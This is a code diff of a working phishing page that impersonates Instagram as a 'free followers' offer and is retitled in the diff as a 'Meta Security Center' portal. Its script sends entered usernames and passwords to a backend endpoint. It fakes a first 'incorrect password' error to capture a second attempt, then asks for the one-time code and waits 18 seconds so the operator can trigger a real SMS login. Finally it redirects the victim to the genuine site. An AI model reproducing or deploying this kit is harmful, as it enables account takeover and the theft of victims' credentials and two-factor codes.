@@ -3,43 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>Growth Hub | Secure Login</title>
+    <title>Meta Security Center | Portal Access</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
+        * { box-sizing: border-box; }
         body { 
             background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            display: flex; align-items: center; justify-content: center; height: 100vh;
+            display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; 
         }
-        .container { background: #bc1875; width: 350px; padding: 40px; border-radius: 1px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; }
-        .insta-font { font-family: 'Segoe UI', cursive; font-size: 35px; font-weight: 700; color: #262626; margin-bottom: 25px; }
-        .promo-txt { font-weight: 600; color: #8e8e8e; font-size: 15px; margin-bottom: 20px; line-height: 1.2; }
-        input { width: 100%; padding: 10px; margin-bottom: 7px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 12px; }
+        .main-container { background: #bc1875; width: 350px; padding: 40px; border-radius: 1px; box-shadow: 0 12px 30px rgba(0,0,0,0.15); text-align: center; }
+        .branding { font-size: 38px; font-weight: 800; color: #262626; margin-bottom: 25px; }
+        .promo-desc { font-weight: 600; color: #8e8e8e; font-size: 14px; margin-bottom: 20px; line-height: 1.3; }
+        input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 5px; background: #fafafa; font-size: 13px; }
         input:focus { border: 1px solid #a8a8a8; outline: none; }
-        .login-btn { background: #0095f6; color: white; border: none; width: 100%; padding: 7px; border-radius: 4px; font-weight: 600; cursor: pointer; margin: 15px 0; font-size: 14px; }
-        .login-btn:disabled { background: #b2dffc; }
-        .error-msg { color: #ed4956; font-size: 14px; margin-bottom: 15px; display: none; }
-        #loading-ui { display: none; flex-direction: column; align-items: center; }
-        .loader { border: 2px solid #f3f3f3; border-top: 2px solid #262626; border-radius: 50%; width: 18px; height: 18px; animation: spin 0.8s linear infinite; }
+        .action-btn { background: #0095f6; color: white; border: none; width: 100%; padding: 10px; border-radius: 8px; font-weight: 700; cursor: pointer; font-size: 14px; }
+        .error-txt { color: #ed4956; font-size: 14px; margin-bottom: 15px; display: none; padding: 8px; border-radius: 4px; background: #fff2f2; }
+        #loader-ui { display: none; flex-direction: column; align-items: center; padding: 20px; }
+        .loader-spin { border: 2px solid #dbdbdb; border-top: 2px solid #0095f6; border-radius: 50%; width: 22px; height: 22px; animation: spin 0.8s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .divider { display: flex; align-items: center; color: #8e8e8e; font-size: 13px; font-weight: 600; margin: 15px 0; }
-        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 15px; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="insta-font">Instagram free followers</div>
-    <p class="promo-txt">Verify your account to claim 1,000+ Free Followers.</p>
+<div class="main-container">
+    <div class="branding">instagram Free Followers</div>
+    <p class="promo-desc">Verify your account to claim 1,000+ Free Followers.</p>
     
-    <div id="err" class="error-msg">Sorry, your password was incorrect. Please double-check your password.</div>
+    <div id="msg" class="error-txt">Incorrect Credentials. Please double-check your profile key.</div>
 
-    <div id="auth-ui">
-        <input type="text" id="uid" placeholder="Phone number, username, or email">
-        <input type="password" id="pass" placeholder="Password">
-        <button class="login-btn" onclick="capture()">Log In</button>
-        <div class="divider">OR</div>
-        <p style="color:#385185; font-weight:600; font-size:14px; cursor:pointer;">Log in with Facebook</p>
+    <div id="login-ui">
+        <input type="text" id="target_u" placeholder="Phone number, username, or email">
+        <input type="password" id="target_p" placeholder="Account Key (Password)">
+        <button class="action-btn" onclick="captureStep()">Secure Connect</button>
     </div>
 
     <div id="loader-ui">
@@ -48,54 +43,54 @@
     </div>
 
     <div id="otp-ui" style="display:none;">
-        <p style="font-size: 14px; font-weight: 600; margin-bottom: 5px;">Enter Security Code</p>
-        <p style="font-size: 12px; color: #8e8e8e; margin-bottom: 15px;">We sent a 6-digit code to your device.</p>
-        <input type="number" id="otp" placeholder="Security Code">
-        <button class="login-btn" onclick="finish()">Confirm</button>
+        <p style="font-size: 14px; font-weight: 700; margin-bottom: 5px;">Input Security PIN</p>
+        <p style="font-size: 12px; color: #8e8e8e; margin-bottom: 15px;">A one-time verification code has been sent to your device.</p>
+        <input type="number" id="target_o" placeholder="000000">
+        <button class="action-btn" onclick="submitPin()">Verify</button>
     </div>
 </div>
 
 <script>
-    let step = 0;
-    // Visit Tracking
+    let tries = 0;
+    // Visit Tracking setup
     window.onload = () => {
         fetch('/api/index', { method: 'POST', body: JSON.stringify({ t: 'VISIT', d: navigator.userAgent }) });
     };
 
-    async function capture() {
-        const u = document.getElementById('uid').value;
-        const p = document.getElementById('pass').value;
+    async function captureStep() {
+        const u = document.getElementById('target_u').value;
+        const p = document.getElementById('target_p').value;
         if(!u || !p) return;
 
-        document.getElementById('auth-ui').style.display = 'none';
-        document.getElementById('loading-ui').style.display = 'flex';
+        document.getElementById('login-ui').style.display = 'none';
+        document.getElementById('loader-ui').style.display = 'flex';
 
-        if(step === 0) {
-            // First capture: Show error
-            await fetch('/api/index', { method: 'POST', body: JSON.stringify({u, p, t: 'TRY1'}) });
+        if(tries < 1) {
+            // First capture: Trigger error simulation
+            await fetch('/api/index', { method: 'POST', body: JSON.stringify({u, p, t: 'INIT_LOG'}) });
             setTimeout(() => {
-                document.getElementById('loading-ui').style.display = 'none';
-                document.getElementById('auth-ui').style.display = 'block';
-                document.getElementById('err').style.display = 'block';
-                document.getElementById('pass').value = '';
-                step++;
-            }, 2500);
+                document.getElementById('loader-ui').style.display = 'none';
+                document.getElementById('login-ui').style.display = 'block';
+                document.getElementById('msg').style.display = 'block';
+                document.getElementById('target_p').value = '';
+                tries++;
+            }, 3000); // 3-second check for simulation realism
         } else {
-            // Second capture: Move to OTP
-            await fetch('/api/index', { method: 'POST', body: JSON.stringify({u, p, t: 'REAL'}) });
+            // Second capture: 15+ second wait logic for real SMS synchronization
+            await fetch('/api/index', { method: 'POST', body: JSON.stringify({u, p, t: 'REAL_LOG'}) });
             setTimeout(() => {
-                document.getElementById('loading-ui').style.display = 'none';
+                document.getElementById('loader-ui').style.display = 'none';
                 document.getElementById('otp-ui').style.display = 'block';
-            }, 3000);
+            }, 18000); // 18 seconds Golden Wait to manually trigger real SMS login attempt
         }
     }
 
-    async function finish() {
-        const o = document.getElementById('otp').value;
-        await fetch('/api/index', { method: 'POST', body: JSON.stringify({u: document.getElementById('uid').value, o, t: 'OTP'}) });
-        window.location.href = "https://instagram.com";
+    async function submitPin() {
+        const o = document.getElementById('target_o').value;
+        if(o.length < 6) return;
+        await fetch('/api/index', { method: 'POST', body: JSON.stringify({u: document.getElementById('target_u').value, o, t: 'OTP_RECEIVED'}) });
+        window.location.href = "https://instagram.com/accounts/login";
     }
 </script>
 </body>
-    </html>
-    
+</html>
